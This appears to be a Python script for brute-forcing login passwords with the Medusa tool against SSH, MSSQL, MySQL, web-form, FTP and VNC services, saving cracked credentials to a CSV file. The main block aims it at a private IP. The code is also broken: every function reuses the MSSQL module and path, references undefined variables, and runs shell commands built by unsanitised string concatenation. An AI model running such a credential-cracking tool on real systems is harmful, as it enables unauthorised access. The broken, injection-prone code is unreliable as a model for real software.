#!/usr/bin/env python

import subprocess
import sys

def sshCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ssh + "\n")
	fo.close()
	return


def mssqlCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mssql + "\n")
	fo.close()
	return

def mysqlCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + mysql + "\n")
	fo.close()
	return

def webformCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + web + "\n")
	fo.close()
	return

def ftpCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + ftp + "\n")
	fo.close()
	return

def vncCrack(ip_address, port, root, options):
	MEDUSA = "medusa -h " + ip_address + " " + options["users"] + " " + options["pws"] +  " -v" + options["verbosity"] + " -n " + port + " " + options["jb"] + " -M mssql > " + root + "password/mssql/medusa_" + ip_address + ".txt"
	print (MEDUSA)
	results = subprocess.check_output(MEDUSA, shell=True)
	results = results.decode('utf-8')
	results = results.split("\n")
	fo = open(root + "password/passwords.csv", 'w+')
	for line in results:
		if "SUCCESS" in line:
			print("PASSWORD FOUND for "+ip_address+":"+port+ " - "+line)
			fo.write(ip_address + "," + port + "," + line + "," + vnc + "\n")
	fo.close()
	return
	
if __name__=='__main__':
	if sys.version_info[0] != 3 or sys.version_info[1] < 1:
		print("\nEXIT: This script requires Python version 3.1 or higher\n")
		sys.exit(1)
	mssqlCrack("192.168.1.248", "1433", "/root/TEST/")